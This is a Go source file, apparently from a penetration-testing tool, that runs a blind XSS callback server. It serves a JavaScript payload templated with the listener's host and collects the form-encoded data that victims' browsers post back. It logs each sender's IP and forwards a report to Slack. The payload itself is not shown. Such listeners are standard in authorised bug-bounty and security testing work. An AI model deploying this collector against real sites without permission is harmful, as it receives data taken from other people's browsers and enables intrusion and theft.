// Package blindxss allows us to listen for blind xss
package blindxss

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"

	"github.com/cosmoscrew/thewidow/outputs"
	"github.com/sirupsen/logrus"
)

// BlindXSS strucutre holds payloads and other required stuff
type BlindXSS struct {
	Payload string
	Outputs *outputs.Outputs
}

// New registers required endpoints for blind-xss testing
func New(mux *http.ServeMux, host string, output *outputs.Outputs) *BlindXSS {
	b := &BlindXSS{
		Payload: strings.Replace(Payload, "{{host}}", host, -1),
		Outputs: output,
	}
	mux.HandleFunc("/m", b.Handler)

	return b
}

// Handler handles a GET or POST request to blind-xss endpoint
func (b *BlindXSS) Handler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		w.Header().Set("Content-Type", "application/javascript")
		fmt.Fprintf(w, "%s", b.Payload)
	} else if r.Method == "POST" {
		data, err := ioutil.ReadAll(r.Body)
		if err != nil {
			logrus.WithError(err).Warning("Could not read body")
			return
		}
		r.Body.Close()

		body := string(data)
		go b.ProcessRequest(body, r.RemoteAddr)
	}
}

// ProcessRequest processes a single blind-xss request
func (b *BlindXSS) ProcessRequest(body string, RemoteAddr string) {
	q, err := url.ParseQuery(body)
	if err != nil {
		logrus.WithError(err).Warning("Could not parse query")
		return
	}

	values := make(map[string]string)
	for key := range q {
		dataDecoded, err := url.QueryUnescape(q.Get(key))
		if err != nil {
			logrus.WithError(err).Warning("Could not decode form field")
			return
		}
		values[key] = dataDecoded
	}
	values["ip"] = RemoteAddr

	message := NewReport(values)
	message.Print()
	b.Outputs.SendNotificationToSlack(message.Slack())
}
